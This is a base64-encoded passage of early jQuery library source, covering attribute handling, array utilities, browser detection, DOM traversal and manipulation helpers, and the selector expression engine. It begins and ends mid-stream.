0aGUgdHlwZSBwcm9wZXJ0eSB0byBiZSBjaGFuZ2VkIChzaW5jZSBpdCBjYXVzZXMgcHJvYmxlbXMgaW4gSUUpCgkJCQlpZiAoIG5hbWUgPT0gInR5cGUiICYmIGpRdWVyeS5ub2RlTmFtZSggZWxlbSwgImlucHV0IiApICYmIGVsZW0ucGFyZW50Tm9kZSApCgkJCQkJdGhyb3cgInR5cGUgcHJvcGVydHkgY2FuJ3QgYmUgY2hhbmdlZCI7CgoJCQkJLy8gY29udmVydCB0aGUgdmFsdWUgdG8gYSBzdHJpbmcgKGFsbCBicm93c2VycyBkbyB0aGlzIGJ1dCBJRSkgc2VlICMxMDcwCgkJCQllbGVtLnNldEF0dHJpYnV0ZSggbmFtZSwgIiIgKyB2YWx1ZSApOwoJCQl9CgoJCQlpZiAoIGpRdWVyeS5icm93c2VyLm1zaWUgJiYgL2hyZWZ8c3JjLy50ZXN0KCBuYW1lICkgJiYgIWpRdWVyeS5pc1hNTERvYyggZWxlbSApICkgCgkJCQlyZXR1cm4gZWxlbS5nZXRBdHRyaWJ1dGUoIG5hbWUsIDIgKTsKCgkJCXJldHVybiBlbGVtLmdldEF0dHJpYnV0ZSggbmFtZSApOwoKCQkvLyBlbGVtIGlzIGFjdHVhbGx5IGVsZW0uc3R5bGUgLi4uIHNldCB0aGUgc3R5bGUKCQl9IGVsc2UgewoJCQkvLyBJRSBhY3R1YWxseSB1c2VzIGZpbHRlcnMgZm9yIG9wYWNpdHkKCQkJaWYgKCBuYW1lID09ICJvcGFjaXR5IiAmJiBqUXVlcnkuYnJvd3Nlci5tc2llICkgewoJCQkJaWYgKCB2YWx1ZSAhPSB1bmRlZmluZWQgKSB7CgkJCQkJLy8gSUUgaGFzIHRyb3VibGUgd2l0aCBvcGFjaXR5IGlmIGl0IGRvZXMgbm90IGhhdmUgbGF5b3V0CgkJCQkJLy8gRm9yY2UgaXQgYnkgc2V0dGluZyB0aGUgem9vbSBsZXZlbAoJCQkJCWVsZW0uem9vbSA9IDE7IAoJCgkJCQkJLy8gU2V0IHRoZSBhbHBoYSBmaWx0ZXIgdG8gc2V0IHRoZSBvcGFjaXR5CgkJCQkJZWxlbS5maWx0ZXIgPSAoZWxlbS5maWx0ZXIgfHwgIiIpLnJlcGxhY2UoIC9hbHBoYVwoW14pXSpcKS8sICIiICkgKwoJCQkJCQkocGFyc2VGbG9hdCggdmFsdWUgKS50b1N0cmluZygpID09ICJOYU4iID8gIiIgOiAiYWxwaGEob3BhY2l0eT0iICsgdmFsdWUgKiAxMDAgKyAiKSIpOwoJCQkJfQoJCgkJCQlyZXR1cm4gZWxlbS5maWx0ZXIgJiYgZWxlbS5maWx0ZXIuaW5kZXhPZigib3BhY2l0eT0iKSA+PSAwID8KCQkJCQkocGFyc2VGbG9hdCggZWxlbS5maWx0ZXIubWF0Y2goL29wYWNpdHk9KFteKV0qKS8pWzFdICkgLyAxMDApLnRvU3RyaW5nKCkgOgoJCQkJCSIiOwoJCQl9CgoJCQluYW1lID0gbmFtZS5yZXBsYWNlKC8tKFthLXpdKS9pZywgZnVuY3Rpb24oYWxsLCBsZXR0ZXIpewoJCQkJcmV0dXJuIGxldHRlci50b1VwcGVyQ2FzZSgpOwoJCQl9KTsKCgkJCWlmICggdmFsdWUgIT0gdW5kZWZpbmVkICkKCQkJCWVsZW1bIG5hbWUgXSA9IHZhbHVlOwoKCQkJcmV0dXJuIGVsZW1bIG5hbWUgXTsKCQl9Cgl9LAoJCgl0cmltOiBmdW5jdGlvbiggdGV4dCApIHsKCQlyZXR1cm4gKHRleHQgfHwgIiIpLnJlcGxhY2UoIC9eXHMrfFxzKyQvZywgIiIgKTsKCX0sCgoJbWFrZUFycmF5OiBmdW5jdGlvbiggYXJyYXkgKSB7CgkJdmFyIHJldCA9IFtdOwoKCQkvLyBOZWVkIHRvIHVzZSB0eXBlb2YgdG8gZmlnaHQgU2FmYXJpIGNoaWxkTm9kZXMgY3Jhc2hlcwoJCWlmICggdHlwZW9mIGFycmF5ICE9ICJhcnJheSIgKQoJCQlmb3IgKCB2YXIgaSA9IDAsIGxlbmd0aCA9IGFycmF5Lmxlbmd0aDsgaSA8IGxlbmd0aDsgaSsrICkKCQkJCXJldC5wdXNoKCBhcnJheVsgaSBdICk7CgkJZWxzZQoJCQlyZXQgPSBhcnJheS5zbGljZSggMCApOwoKCQlyZXR1cm4gcmV0OwoJfSwKCglpbkFycmF5OiBmdW5jdGlvbiggZWxlbSwgYXJyYXkgKSB7CgkJZm9yICggdmFyIGkgPSAwLCBsZW5ndGggPSBhcnJheS5sZW5ndGg7IGkgPCBsZW5ndGg7IGkrKyApCgkJCWlmICggYXJyYXlbIGkgXSA9PSBlbGVtICkKCQkJCXJldHVybiBpOwoKCQlyZXR1cm4gLTE7Cgl9LAoKCW1lcmdlOiBmdW5jdGlvbiggZmlyc3QsIHNlY29uZCApIHsKCQkvLyBXZSBoYXZlIHRvIGxvb3AgdGhpcyB3YXkgYmVjYXVzZSBJRSAmIE9wZXJhIG92ZXJ3cml0ZSB0aGUgbGVuZ3RoCgkJLy8gZXhwYW5kbyBvZiBnZXRFbGVtZW50c0J5VGFnTmFtZQoKCQkvLyBBbHNvLCB3ZSBuZWVkIHRvIG1ha2Ugc3VyZSB0aGF0IHRoZSBjb3JyZWN0IGVsZW1lbnRzIGFyZSBiZWluZyByZXR1cm5lZAoJCS8vIChJRSByZXR1cm5zIGNvbW1lbnQgbm9kZXMgaW4gYSAnKicgcXVlcnkpCgkJaWYgKCBqUXVlcnkuYnJvd3Nlci5tc2llICkgewoJCQlmb3IgKCB2YXIgaSA9IDA7IHNlY29uZFsgaSBdOyBpKysgKQoJCQkJaWYgKCBzZWNvbmRbIGkgXS5ub2RlVHlwZSAhPSA4ICkKCQkJCQlmaXJzdC5wdXNoKCBzZWNvbmRbIGkgXSApOwoKCQl9IGVsc2UKCQkJZm9yICggdmFyIGkgPSAwOyBzZWNvbmRbIGkgXTsgaSsrICkKCQkJCWZpcnN0LnB1c2goIHNlY29uZFsgaSBdICk7CgoJCXJldHVybiBmaXJzdDsKCX0sCgoJdW5pcXVlOiBmdW5jdGlvbiggYXJyYXkgKSB7CgkJdmFyIHJldCA9IFtdLCBkb25lID0ge307CgoJCXRyeSB7CgoJCQlmb3IgKCB2YXIgaSA9IDAsIGxlbmd0aCA9IGFycmF5Lmxlbmd0aDsgaSA8IGxlbmd0aDsgaSsrICkgewoJCQkJdmFyIGlkID0galF1ZXJ5LmRhdGEoIGFycmF5WyBpIF0gKTsKCgkJCQlpZiAoICFkb25lWyBpZCBdICkgewoJCQkJCWRvbmVbIGlkIF0gPSB0cnVlOwoJCQkJCXJldC5wdXNoKCBhcnJheVsgaSBdICk7CgkJCQl9CgkJCX0KCgkJfSBjYXRjaCggZSApIHsKCQkJcmV0ID0gYXJyYXk7CgkJfQoKCQlyZXR1cm4gcmV0OwoJfSwKCglncmVwOiBmdW5jdGlvbiggZWxlbXMsIGNhbGxiYWNrLCBpbnYgKSB7CgkJdmFyIHJldCA9IFtdOwoKCQkvLyBHbyB0aHJvdWdoIHRoZSBhcnJheSwgb25seSBzYXZpbmcgdGhlIGl0ZW1zCgkJLy8gdGhhdCBwYXNzIHRoZSB2YWxpZGF0b3IgZnVuY3Rpb24KCQlmb3IgKCB2YXIgaSA9IDAsIGxlbmd0aCA9IGVsZW1zLmxlbmd0aDsgaSA8IGxlbmd0aDsgaSsrICkKCQkJaWYgKCAhaW52ICYmIGNhbGxiYWNrKCBlbGVtc1sgaSBdLCBpICkgfHwgaW52ICYmICFjYWxsYmFjayggZWxlbXNbIGkgXSwgaSApICkKCQkJCXJldC5wdXNoKCBlbGVtc1sgaSBdICk7CgoJCXJldHVybiByZXQ7Cgl9LAoKCW1hcDogZnVuY3Rpb24oIGVsZW1zLCBjYWxsYmFjayApIHsKCQl2YXIgcmV0ID0gW107CgoJCS8vIEdvIHRocm91Z2ggdGhlIGFycmF5LCB0cmFuc2xhdGluZyBlYWNoIG9mIHRoZSBpdGVtcyB0byB0aGVpcgoJCS8vIG5ldyB2YWx1ZSAob3IgdmFsdWVzKS4KCQlmb3IgKCB2YXIgaSA9IDAsIGxlbmd0aCA9IGVsZW1zLmxlbmd0aDsgaSA8IGxlbmd0aDsgaSsrICkgewoJCQl2YXIgdmFsdWUgPSBjYWxsYmFjayggZWxlbXNbIGkgXSwgaSApOwoKCQkJaWYgKCB2YWx1ZSAhPT0gbnVsbCAmJiB2YWx1ZSAhPSB1bmRlZmluZWQgKSB7CgkJCQlpZiAoIHZhbHVlLmNvbnN0cnVjdG9yICE9IEFycmF5ICkKCQkJCQl2YWx1ZSA9IFsgdmFsdWUgXTsKCgkJCQlyZXQgPSByZXQuY29uY2F0KCB2YWx1ZSApOwoJCQl9CgkJfQoKCQlyZXR1cm4gcmV0OwoJfQp9KTsKCnZhciB1c2VyQWdlbnQgPSBuYXZpZ2F0b3IudXNlckFnZW50LnRvTG93ZXJDYXNlKCk7CgovLyBGaWd1cmUgb3V0IHdoYXQgYnJvd3NlciBpcyBiZWluZyB1c2VkCmpRdWVyeS5icm93c2VyID0gewoJdmVyc2lvbjogKHVzZXJBZ2VudC5tYXRjaCggLy4rKD86cnZ8aXR8cmF8aWUpW1wvOiBdKFtcZC5dKykvICkgfHwgW10pWzFdLAoJc2FmYXJpOiAvd2Via2l0Ly50ZXN0KCB1c2VyQWdlbnQgKSwKCW9wZXJhOiAvb3BlcmEvLnRlc3QoIHVzZXJBZ2VudCApLAoJbXNpZTogL21zaWUvLnRlc3QoIHVzZXJBZ2VudCApICYmICEvb3BlcmEvLnRlc3QoIHVzZXJBZ2VudCApLAoJbW96aWxsYTogL21vemlsbGEvLnRlc3QoIHVzZXJBZ2VudCApICYmICEvKGNvbXBhdGlibGV8d2Via2l0KS8udGVzdCggdXNlckFnZW50ICkKfTsKCnZhciBzdHlsZUZsb2F0ID0galF1ZXJ5LmJyb3dzZXIubXNpZSA/Cgkic3R5bGVGbG9hdCIgOgoJImNzc0Zsb2F0IjsKCQpqUXVlcnkuZXh0ZW5kKHsKCS8vIENoZWNrIHRvIHNlZSBpZiB0aGUgVzNDIGJveCBtb2RlbCBpcyBiZWluZyB1c2VkCglib3hNb2RlbDogIWpRdWVyeS5icm93c2VyLm1zaWUgfHwgZG9jdW1lbnQuY29tcGF0TW9kZSA9PSAiQ1NTMUNvbXBhdCIsCgkKCXByb3BzOiB7CgkJImZvciI6ICJodG1sRm9yIiwKCQkiY2xhc3MiOiAiY2xhc3NOYW1lIiwKCQkiZmxvYXQiOiBzdHlsZUZsb2F0LAoJCWNzc0Zsb2F0OiBzdHlsZUZsb2F0LAoJCXN0eWxlRmxvYXQ6IHN0eWxlRmxvYXQsCgkJaW5uZXJIVE1MOiAiaW5uZXJIVE1MIiwKCQljbGFzc05hbWU6ICJjbGFzc05hbWUiLAoJCXZhbHVlOiAidmFsdWUiLAoJCWRpc2FibGVkOiAiZGlzYWJsZWQiLAoJCWNoZWNrZWQ6ICJjaGVja2VkIiwKCQlyZWFkb25seTogInJlYWRPbmx5IiwKCQlzZWxlY3RlZDogInNlbGVjdGVkIiwKCQltYXhsZW5ndGg6ICJtYXhMZW5ndGgiLAoJCXNlbGVjdGVkSW5kZXg6ICJzZWxlY3RlZEluZGV4IiwKCQlkZWZhdWx0VmFsdWU6ICJkZWZhdWx0VmFsdWUiLAoJCXRhZ05hbWU6ICJ0YWdOYW1lIiwKCQlub2RlTmFtZTogIm5vZGVOYW1lIgoJfQp9KTsKCmpRdWVyeS5lYWNoKHsKCXBhcmVudDogZnVuY3Rpb24oZWxlbSl7cmV0dXJuIGVsZW0ucGFyZW50Tm9kZTt9LAoJcGFyZW50czogZnVuY3Rpb24oZWxlbSl7cmV0dXJuIGpRdWVyeS5kaXIoZWxlbSwicGFyZW50Tm9kZSIpO30sCgluZXh0OiBmdW5jdGlvbihlbGVtKXtyZXR1cm4galF1ZXJ5Lm50aChlbGVtLDIsIm5leHRTaWJsaW5nIik7fSwKCXByZXY6IGZ1bmN0aW9uKGVsZW0pe3JldHVybiBqUXVlcnkubnRoKGVsZW0sMiwicHJldmlvdXNTaWJsaW5nIik7fSwKCW5leHRBbGw6IGZ1bmN0aW9uKGVsZW0pe3JldHVybiBqUXVlcnkuZGlyKGVsZW0sIm5leHRTaWJsaW5nIik7fSwKCXByZXZBbGw6IGZ1bmN0aW9uKGVsZW0pe3JldHVybiBqUXVlcnkuZGlyKGVsZW0sInByZXZpb3VzU2libGluZyIpO30sCglzaWJsaW5nczogZnVuY3Rpb24oZWxlbSl7cmV0dXJuIGpRdWVyeS5zaWJsaW5nKGVsZW0ucGFyZW50Tm9kZS5maXJzdENoaWxkLGVsZW0pO30sCgljaGlsZHJlbjogZnVuY3Rpb24oZWxlbSl7cmV0dXJuIGpRdWVyeS5zaWJsaW5nKGVsZW0uZmlyc3RDaGlsZCk7fSwKCWNvbnRlbnRzOiBmdW5jdGlvbihlbGVtKXtyZXR1cm4galF1ZXJ5Lm5vZGVOYW1lKGVsZW0sImlmcmFtZSIpP2VsZW0uY29udGVudERvY3VtZW50fHxlbGVtLmNvbnRlbnRXaW5kb3cuZG9jdW1lbnQ6alF1ZXJ5Lm1ha2VBcnJheShlbGVtLmNoaWxkTm9kZXMpO30KfSwgZnVuY3Rpb24obmFtZSwgZm4pewoJalF1ZXJ5LmZuWyBuYW1lIF0gPSBmdW5jdGlvbiggc2VsZWN0b3IgKSB7CgkJdmFyIHJldCA9IGpRdWVyeS5tYXAoIHRoaXMsIGZuICk7CgoJCWlmICggc2VsZWN0b3IgJiYgdHlwZW9mIHNlbGVjdG9yID09ICJzdHJpbmciICkKCQkJcmV0ID0galF1ZXJ5Lm11bHRpRmlsdGVyKCBzZWxlY3RvciwgcmV0ICk7CgoJCXJldHVybiB0aGlzLnB1c2hTdGFjayggalF1ZXJ5LnVuaXF1ZSggcmV0ICkgKTsKCX07Cn0pOwoKalF1ZXJ5LmVhY2goewoJYXBwZW5kVG86ICJhcHBlbmQiLAoJcHJlcGVuZFRvOiAicHJlcGVuZCIsCglpbnNlcnRCZWZvcmU6ICJiZWZvcmUiLAoJaW5zZXJ0QWZ0ZXI6ICJhZnRlciIsCglyZXBsYWNlQWxsOiAicmVwbGFjZVdpdGgiCn0sIGZ1bmN0aW9uKG5hbWUsIG9yaWdpbmFsKXsKCWpRdWVyeS5mblsgbmFtZSBdID0gZnVuY3Rpb24oKSB7CgkJdmFyIGFyZ3MgPSBhcmd1bWVudHM7CgoJCXJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJZm9yICggdmFyIGkgPSAwLCBsZW5ndGggPSBhcmdzLmxlbmd0aDsgaSA8IGxlbmd0aDsgaSsrICkKCQkJCWpRdWVyeSggYXJnc1sgaSBdIClbIG9yaWdpbmFsIF0oIHRoaXMgKTsKCQl9KTsKCX07Cn0pOwoKalF1ZXJ5LmVhY2goewoJcmVtb3ZlQXR0cjogZnVuY3Rpb24oIG5hbWUgKSB7CgkJalF1ZXJ5LmF0dHIoIHRoaXMsIG5hbWUsICIiICk7CgkJaWYgKHRoaXMubm9kZVR5cGUgPT0gMSkgCgkJCXRoaXMucmVtb3ZlQXR0cmlidXRlKCBuYW1lICk7Cgl9LAoKCWFkZENsYXNzOiBmdW5jdGlvbiggY2xhc3NOYW1lcyApIHsKCQlqUXVlcnkuY2xhc3NOYW1lLmFkZCggdGhpcywgY2xhc3NOYW1lcyApOwoJfSwKCglyZW1vdmVDbGFzczogZnVuY3Rpb24oIGNsYXNzTmFtZXMgKSB7CgkJalF1ZXJ5LmNsYXNzTmFtZS5yZW1vdmUoIHRoaXMsIGNsYXNzTmFtZXMgKTsKCX0sCgoJdG9nZ2xlQ2xhc3M6IGZ1bmN0aW9uKCBjbGFzc05hbWVzICkgewoJCWpRdWVyeS5jbGFzc05hbWVbIGpRdWVyeS5jbGFzc05hbWUuaGFzKCB0aGlzLCBjbGFzc05hbWVzICkgPyAicmVtb3ZlIiA6ICJhZGQiIF0oIHRoaXMsIGNsYXNzTmFtZXMgKTsKCX0sCgoJcmVtb3ZlOiBmdW5jdGlvbiggc2VsZWN0b3IgKSB7CgkJaWYgKCAhc2VsZWN0b3IgfHwgalF1ZXJ5LmZpbHRlciggc2VsZWN0b3IsIFsgdGhpcyBdICkuci5sZW5ndGggKSB7CgkJCS8vIFByZXZlbnQgbWVtb3J5IGxlYWtzCgkJCWpRdWVyeSggIioiLCB0aGlzICkuYWRkKHRoaXMpLmVhY2goZnVuY3Rpb24oKXsKCQkJCWpRdWVyeS5ldmVudC5yZW1vdmUodGhpcyk7CgkJCQlqUXVlcnkucmVtb3ZlRGF0YSh0aGlzKTsKCQkJfSk7CgkJCWlmICh0aGlzLnBhcmVudE5vZGUpCgkJCQl0aGlzLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoIHRoaXMgKTsKCQl9Cgl9LAoKCWVtcHR5OiBmdW5jdGlvbigpIHsKCQkvLyBSZW1vdmUgZWxlbWVudCBub2RlcyBhbmQgcHJldmVudCBtZW1vcnkgbGVha3MKCQlqUXVlcnkoICI+KiIsIHRoaXMgKS5yZW1vdmUoKTsKCQkKCQkvLyBSZW1vdmUgYW55IHJlbWFpbmluZyBub2RlcwoJCXdoaWxlICggdGhpcy5maXJzdENoaWxkICkKCQkJdGhpcy5yZW1vdmVDaGlsZCggdGhpcy5maXJzdENoaWxkICk7Cgl9Cn0sIGZ1bmN0aW9uKG5hbWUsIGZuKXsKCWpRdWVyeS5mblsgbmFtZSBdID0gZnVuY3Rpb24oKXsKCQlyZXR1cm4gdGhpcy5lYWNoKCBmbiwgYXJndW1lbnRzICk7Cgl9Owp9KTsKCmpRdWVyeS5lYWNoKFsgIkhlaWdodCIsICJXaWR0aCIgXSwgZnVuY3Rpb24oaSwgbmFtZSl7Cgl2YXIgdHlwZSA9IG5hbWUudG9Mb3dlckNhc2UoKTsKCQoJalF1ZXJ5LmZuWyB0eXBlIF0gPSBmdW5jdGlvbiggc2l6ZSApIHsKCQkvLyBHZXQgd2luZG93IHdpZHRoIG9yIGhlaWdodAoJCXJldHVybiB0aGlzWzBdID09IHdpbmRvdyA/CgkJCS8vIE9wZXJhIHJlcG9ydHMgZG9jdW1lbnQuYm9keS5jbGllbnRbV2lkdGgvSGVpZ2h0XSBwcm9wZXJseSBpbiBib3RoIHF1aXJrcyBhbmQgc3RhbmRhcmRzCgkJCWpRdWVyeS5icm93c2VyLm9wZXJhICYmIGRvY3VtZW50LmJvZHlbICJjbGllbnQiICsgbmFtZSBdIHx8IAoJCQkKCQkJLy8gU2FmYXJpIHJlcG9ydHMgaW5uZXJbV2lkdGgvSGVpZ2h0XSBqdXN0IGZpbmUgKE1vemlsbGEgYW5kIE9wZXJhIGluY2x1ZGUgc2Nyb2xsIGJhciB3aWR0aHMpCgkJCWpRdWVyeS5icm93c2VyLnNhZmFyaSAmJiB3aW5kb3dbICJpbm5lciIgKyBuYW1lIF0gfHwKCQkJCgkJCS8vIEV2ZXJ5b25lIGVsc2UgdXNlIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudCBvciBkb2N1bWVudC5ib2R5IGRlcGVuZGluZyBvbiBRdWlya3MgdnMgU3RhbmRhcmRzIG1vZGUKCQkJZG9jdW1lbnQuY29tcGF0TW9kZSA9PSAiQ1NTMUNvbXBhdCIgJiYgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50WyAiY2xpZW50IiArIG5hbWUgXSB8fCBkb2N1bWVudC5ib2R5WyAiY2xpZW50IiArIG5hbWUgXSA6CgkJCgkJCS8vIEdldCBkb2N1bWVudCB3aWR0aCBvciBoZWlnaHQKCQkJdGhpc1swXSA9PSBkb2N1bWVudCA/CgkJCQkvLyBFaXRoZXIgc2Nyb2xsW1dpZHRoL0hlaWdodF0gb3Igb2Zmc2V0W1dpZHRoL0hlaWdodF0sIHdoaWNoZXZlciBpcyBncmVhdGVyCgkJCQlNYXRoLm1heCggCgkJCQkJTWF0aC5tYXgoZG9jdW1lbnQuYm9keVsic2Nyb2xsIiArIG5hbWVdLCBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnRbInNjcm9sbCIgKyBuYW1lXSksIAoJCQkJCU1hdGgubWF4KGRvY3VtZW50LmJvZHlbIm9mZnNldCIgKyBuYW1lXSwgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50WyJvZmZzZXQiICsgbmFtZV0pIAoJCQkJKSA6CgoJCQkJLy8gR2V0IG9yIHNldCB3aWR0aCBvciBoZWlnaHQgb24gdGhlIGVsZW1lbnQKCQkJCXNpemUgPT0gdW5kZWZpbmVkID8KCQkJCQkvLyBHZXQgd2lkdGggb3IgaGVpZ2h0IG9uIHRoZSBlbGVtZW50CgkJCQkJKHRoaXMubGVuZ3RoID8galF1ZXJ5LmNzcyggdGhpc1swXSwgdHlwZSApIDogbnVsbCkgOgoKCQkJCQkvLyBTZXQgdGhlIHdpZHRoIG9yIGhlaWdodCBvbiB0aGUgZWxlbWVudCAoZGVmYXVsdCB0byBwaXhlbHMgaWYgdmFsdWUgaXMgdW5pdGxlc3MpCgkJCQkJdGhpcy5jc3MoIHR5cGUsIHNpemUuY29uc3RydWN0b3IgPT0gU3RyaW5nID8gc2l6ZSA6IHNpemUgKyAicHgiICk7Cgl9Owp9KTsKCnZhciBjaGFycyA9IGpRdWVyeS5icm93c2VyLnNhZmFyaSAmJiBwYXJzZUludChqUXVlcnkuYnJvd3Nlci52ZXJzaW9uKSA8IDQxNyA/CgkJIig/OltcXHcqXy1dfFxcXFwuKSIgOgoJCSIoPzpbXFx3XHUwMTI4LVx1RkZGRipfLV18XFxcXC4pIiwKCXF1aWNrQ2hpbGQgPSBuZXcgUmVnRXhwKCJePlxccyooIiArIGNoYXJzICsgIispIiksCglxdWlja0lEID0gbmV3IFJlZ0V4cCgiXigiICsgY2hhcnMgKyAiKykoIykoIiArIGNoYXJzICsgIispIiksCglxdWlja0NsYXNzID0gbmV3IFJlZ0V4cCgiXihbIy5dPykoIiArIGNoYXJzICsgIiopIik7CgpqUXVlcnkuZXh0ZW5kKHsKCWV4cHI6IHsKCQkiIjogZnVuY3Rpb24oYSxpLG0pe3JldHVybiBtWzJdPT0iKiJ8fGpRdWVyeS5ub2RlTmFtZShhLG1bMl0pO30sCgkJIiMiOiBmdW5jdGlvbihhLGksbSl7cmV0dXJuIGEuZ2V0QXR0cmlidXRlKCJpZCIpPT1tWzJdO30sCgkJIjoiOiB7CgkJCS8vIFBvc2l0aW9uIENoZWNrcwoJCQlsdDogZnVuY3Rpb24oYSxpLG0pe3JldHVybiBpPG1bM10tMDt9LAoJCQlndDogZnVuY3Rpb24oYSxpLG0pe3JldHVybiBpPm1bM10tMDt9LAoJCQludGg6IGZ1bmN0aW9uKGEsaSxtKXtyZXR1cm4gbVszXS0wPT1pO30sCgkJCWVxOiBmdW5jdGlvbihhLGksbSl7cmV0dXJuIG1bM10tMD09aTt9LAoJCQlmaXJzdDogZnVuY3Rpb24oYSxpKXtyZXR1cm4gaT09MDt9LAoJCQlsYXN0OiBmdW5jdGlvbihhLGksbSxyKXtyZXR1cm4gaT09ci5sZW5ndGgtMTt9LAoJCQlldmVuOiBmdW5jdGlvbihhLGkpe3JldHVybiBpJTI9PTA7fSwKCQkJb2RkOiBmdW5jdGlvbihhLGkpe3JldHVybiBpJTI7fSwKCgkJCS8vIENoaWxkIENoZWNrcwoJCQkiZmlyc3QtY2hpbGQiOiBmdW5jdGlvbihhKXtyZXR1cm4gYS5wYXJlbnROb2RlLmdldEVsZW1lbnRzQnlUYWdOYW1lKCIqIilbMF09PWE7fSwKCQkJImxhc3QtY2hpbGQiOiBmdW5jdGlvbihhKXtyZXR1cm4galF1ZXJ5Lm50aChhLnBhcmVudE5vZGUubGFzdENoaWxkLDEsInByZXZpb3VzU2libGluZyIpPT1hO30sCgkJCSJvbmx5LWNoaWxkIjogZnVuY3Rpb24oYSl7cmV0dXJuICFqUXVlcnkubnRoKGEucGFyZW50Tm9kZS5sYXN0Q2hpbGQsMiwicHJldmlvdXNTaWJsaW5nIik7fSwKCgkJCS8vIFBhcmVudCBDaGVja3MKCQkJcGFyZW50OiBmdW5jdGlvbihhKXtyZXR1cm4gYS5maXJzdENoaWxkO30sCgkJCWVtcHR5OiBmdW5jdGlvbihhKXtyZXR1cm4gIWEuZmlyc3RDaGlsZDt9LAoKCQkJLy8gVGV4dCBDaGVjawoJCQljb250YWluczogZnVuY3Rpb24oYSxpLG0pe3JldHVybiAoYS50ZXh0Q29udGVudHx8YS5pbm5lclRleHR8fGpRdWVyeShhKS50ZXh0KCl8fCIiKS5pbmRleE9mKG1bM10pPj0wO30sCgoJCQkvLyBWaXNpYmlsaXR5CgkJCXZpc2libGU6IGZ1bmN0aW9uKGEpe3JldHVybiAiaGlkZGVuIiE9YS50eXBlJiZqUXVlcnkuY3NzKGEsImRpc3BsYXkiKSE9Im5vbmUiJiZqUXVlcnkuY3NzKGEsInZpc2liaWxpdHkiKSE9ImhpZGRlbiI7fSwKCQkJaGlkZGVuOiBmdW5jdGlvbihhKXtyZXR1cm4gImhpZGRlbiI9PWEudHlwZXx8alF1ZXJ5LmNzcyhhLCJkaXNwbGF5Iik9PSJub25lInx8alF1ZXJ5LmNzcyhhLCJ2aXNpYmlsaXR5Iik9PSJoaWRkZW4iO30sCgoJCQkvLyBGb3JtIGF0dHJpYnV0ZXMKCQkJZW5hYmxlZDogZnVuY3Rpb24oYSl7cmV0dXJuICFhLmRpc2FibGVkO30sCgkJCWRpc2FibGVkOiBmdW5jdGlvbihhKXtyZXR1cm4gYS5kaXNhYmxlZDt9LAoJCQljaGVja2VkOiBmdW5jdGlvbihhKXtyZXR1cm4gYS5jaGVja2VkO30sCgkJCXNlbGVjdGVkOiBmdW5jdGlvbihhKXtyZXR1cm4gYS5zZWxlY3RlZHx8alF1ZXJ5LmF0dHIoYSwic2VsZWN0ZWQiKTt9LAoKCQkJLy8gRm9ybSBlbGVtZW50cwoJCQl0ZXh0OiBmdW5jdGlvbihhKXtyZXR1cm4gInRleHQiPT1hLnR5cGU7fSwKCQkJcmFkaW86IGZ1bmN0aW9uKGEpe3JldHVybiAicmFkaW8iPT1hLnR5cGU7fSwKCQkJY2hlY2tib3g6IGZ1bmN0aW9uKGEpe3JldHVybiAiY2hlY2tib3giPT1hLnR5cGU7fSwKCQkJZmlsZTogZnVuY3Rpb24oYSl7cmV0dXJuICJmaWxlIj09YS50eXBlO30sCgkJCXBhc3N3b3JkOiBmdW5jdGlvbihhKXtyZXR1cm4gInBhc3N3b3JkIj09YS50eXBlO30sCgkJCXN1Ym1pdDogZnVuY3Rpb24oYSl7cmV0dXJuICJzdWJtaXQiPT1hLnR5cGU7fSwKCQkJaW1hZ2U6IGZ1bmN0aW9uKGEpe3JldHVybiAiaW1hZ2UiPT1hLnR5cGU7fSwKCQkJcmVzZXQ6IGZ1bmN0aW9uKGEpe3JldHVybiAicmVzZXQiPT1hLnR5cGU7fSwKCQkJYnV0dG9uOiBmdW5jdGlvbihhKXtyZXR1cm4gImJ1dHRvbiI9PWEudHlwZXx8alF1ZXJ5Lm5vZGVOYW1lKGEsImJ1dHRvbiIpO30sCgkJCWlucHV0OiBmdW5jdGlvbihhKXtyZXR1cm4gL2lucHV0fHNlbGVjdHx0ZXh0YXJlYXxidXR0b24vaS50ZXN0KGEubm9kZU5hbWUpO30sCgoJCQkvLyA6aGFzKCkKCQkJaGFzOiBmdW5jdGlvbihhLGksbSl7cmV0dXJuIGpRdWVyeS5maW5kKG1bM10sYSkubGVuZ3RoO30sCgoJCQkvLyA6aGVhZGVyCgkJCWhlYWRlcjogZnVuY3Rpb24oYSl7cmV0dXJuIC9oXGQvaS50ZXN0KGEubm9kZU5hbWUpO30sCgoJCQkvLyA6YW5pbWF0ZWQKCQkJYW5pbWF0ZWQ6IGZ1bmN0aW9uKGEpe3JldHVybiBqUXVlcnkuZ3JlcChqUXVlcnkudGltZXJzLGZ1bmN0aW9uKGZuKXtyZXR1cm4gYT09Zm4uZWxlbTt9KS5sZW5ndGg7fQoJCX0KCX0sCgkKCS8vIFRoZSByZWd1bGFyIGV4cHJlc3Npb25zIHRoYXQgcG93ZXIgdGhlIHBhcnNpbmcgZW5naW5lCglwYXJzZTogWwoJCS8vIE1hdGNoOiBbQHZhbHVlPSd0ZXN0J10sIFtAZm9vXQoJCS9eKFxbKSAqQD8oW1x3LV0rKSAqKFshKiRefj1dKikgKignPyI/KSguKj8pXDQgKlxdLywKCgkJLy8gTWF0Y2g6IDpjb250YWlucygnZm9vJykKCQkvXig6KShbXHctXSspXCgiPyc/KC4qPyhcKC4qP1wpKT9bXihdKj8pIj8nP1wpLywKCgkJLy8gTWF0Y2g6IDpldmVuLCA6bGFzdC1jaGxpZCwgI2lkLCAuY2xhc3MKCQluZXcgUmVnRXhwKCJeKFs6LiNdKikoIiArIGNoYXJzICsgIispIikKCV0sCgoJbXVsdGlGaWx0ZXI6IGZ1bmN0aW9uKCBleHByLCBlbGVtcywgbm90ICkgewoJCXZhciBvbGQsIGN1ciA9IFtdOwoKCQl3aGlsZSAoIGV4cHIgJiYgZXhwciAhPSBvbGQgKSB7CgkJCW9sZCA9IGV4cHI7CgkJCXZhciBmID0galF1ZXJ5LmZpbHRlciggZXhwciwgZWxlbXMsIG5vdCApOwoJCQlleHByID0gZi50LnJlcGxhY2UoL15ccyosXHMqLywgIiIgKTsKCQkJY3VyID0gbm90ID8gZWxlbXMgPSBmLnIgOiBqUXVlcnkubWVyZ2UoIGN1ciwgZi5yICk7CgkJfQoKCQlyZXR1cm4gY3VyOwoJfSwKCglmaW5kOiBmdW5jdGlvbiggdC